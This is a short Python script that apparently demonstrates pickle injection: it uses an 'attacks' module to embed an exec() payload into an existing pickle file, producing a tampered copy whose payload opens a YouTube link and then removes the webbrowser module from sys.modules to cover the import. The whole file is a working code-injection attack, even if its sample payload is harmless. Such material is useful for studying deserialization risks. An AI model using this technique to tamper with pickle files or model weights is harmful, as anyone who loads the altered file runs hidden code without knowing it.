import pickle
import builtins
from attacks import eval_exec_attack

payload = '''import webbrowser
webbrowser.open("https://www.youtube.com/watch?v=gDjMZvYWUdo")
import sys
del sys.modules['webbrowser']
'''
attack_str = f"exec(\'\'\'{payload}\'\'\')"

in_pickle = "yk.pickle"
test = open(in_pickle, "rb")
eval_exec_attack(test, attack_str, 12, "yk_attacked.pickle")
test.close()